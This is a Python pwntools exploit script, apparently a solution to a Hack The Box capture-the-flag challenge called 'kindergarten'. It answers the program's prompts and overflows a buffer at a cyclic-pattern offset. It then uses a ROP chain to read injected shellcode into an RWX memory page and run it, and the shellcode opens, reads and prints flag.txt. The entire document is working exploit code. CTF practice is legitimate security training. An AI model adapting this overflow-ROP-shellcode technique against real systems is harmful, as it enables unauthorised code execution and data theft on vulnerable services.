from pwn import *

p=None
if args.LOCAL:
    p = process('./kindergarten')
else:
    p = remote('docker.hackthebox.eu', 31735)

context.terminal = ['gnome-terminal', '-e']
if args.GDB:
    gdb.attach(p)

p.recvuntil('clear?')
p.sendline('y')

for _ in range(4):
    p.recvuntil('questions')
    p.sendline('y')
    p.recvuntil('ask!')
    p.sendline('AAAA')

p.recvuntil('questions')
p.sendline('y')

# jaab
#p.sendline(cyclic(0x14c - 1))
# 0x0000000000602000 rwx

context.arch = 'amd64'

rwx = 0x602000
rw  = rwx + 0x500
rop = ROP(ELF('./kindergarten'))

rop.read(0, rwx)
rop.raw(rwx)

payload = cyclic(cyclic_find(b'jaab')) + rop.chain()
p.send(payload)

from time import sleep
sleep(0.5)

sc = shellcraft

sh = sc.open('flag.txt')
sh += sc.read(3, rw, 0x100)
sh += sc.write(1, rw, 0x100)
sh += sc.exit(0)
print (sh)
sh = asm(sh)

p.send(sh)

p.interactive()
